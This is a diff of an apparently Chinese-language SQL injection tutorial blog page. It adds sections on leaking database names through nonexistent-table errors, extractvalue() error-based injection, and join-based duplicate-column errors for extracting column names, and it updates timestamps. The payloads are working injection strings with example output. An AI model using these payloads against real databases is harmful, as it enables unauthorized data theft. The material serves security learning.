@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2023-01-10T02:35:56.000Z">
-<meta property="article:modified_time" content="2023-01-11T05:00:34.866Z">
+<meta property="article:modified_time" content="2023-03-11T08:45:29.298Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="SQL_Injection">
 <meta name="twitter:card" content="summary">
@@ -177,7 +177,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~12.80K
+                        ~13.38K
                     
                     字
                 </li>
@@ -194,7 +194,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1673413234866"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1678524329298"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -250,6 +250,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line">select * from users where id=1 and ascii(substr(databse(),1,1))&gt;64</span><br><span class="line">可以换成：</span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64</span><br></pre></td></tr></table></figure>
 
 <p><del>其实也可以直接使用等于号硬跑脚本，也就只用跑十七八分钟而已</del></p>
+<h2><span id="7过滤了database">7.过滤了database()</span></h2><p><strong>updated in 2023&#x2F;3&#x2F;11</strong></p>
+<p>可以通过查一个不存在的表来爆出库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||(select *from asdf)#</span><br></pre></td></tr></table></figure>
+
+
+
 <h1><span id="0x04-sql注入类型">0x04 SQL注入类型</span></h1><p>分为字符型和数字型两种</p>
 <p>判断方式也很简单：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1  //不报错</span><br><span class="line">?id=1 and 1=2  //报错</span><br><span class="line"></span><br><span class="line">//说明是数字型注入</span><br><span class="line">因为后台语句为</span><br><span class="line">select * from &lt;column_name&gt; where id = x</span><br></pre></td></tr></table></figure>
@@ -295,7 +301,9 @@
 
 
 <p><font color="blue">2.extractvalue()</font></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extravalue(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;))--+</span><br></pre></td></tr></table></figure>
+<p><strong>updated in 2023&#x2F;3&#x2F;11</strong></p>
+<p>extractvalue()的报错注入和updatexml还是有点不一样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; || extractvalue(1,concat(0x7e,(select data from (output))))#</span><br></pre></td></tr></table></figure>
 
 
 
@@ -518,6 +526,16 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(&#x27;~&#x27;,database()),3) or&#x27;</span><br></pre></td></tr></table></figure>
 
+<h2><span id="11join报错注入">11.join+报错注入</span></h2><p><strong>updated in 2023&#x2F;3&#x2F;11</strong></p>
+<p>利用重复查询相同表的方法来爆数据：</p>
+<p>sql语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from 表 a join 表 b)c  //爆表的第一列</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名))c //爆第二个列名</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名,第二列列名))c //爆第三个列名</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>搭配报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; || extractvalue(1,concat(0x7e,(select * from (select * from output a join output b)c)))#</span><br><span class="line">//爆出output表的第一个列名</span><br><span class="line">回显：Duplicate column name &#x27;data&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
 <h1><span id="0x06-结束">0x06 结束</span></h1><p>嗯，凑数标题（</p>
 <p>老采集了我</p>
 <hr>
@@ -617,7 +635,7 @@
                     <a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL_Injection</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-01-11T05:00:34.866Z" itemprop="dateModified">最后编辑：2023-01-11</time>
+                    <time datetime="2023-03-11T08:45:29.298Z" itemprop="dateModified">最后编辑：2023-03-11</time>
                 </div>
             </div>
         </footer>
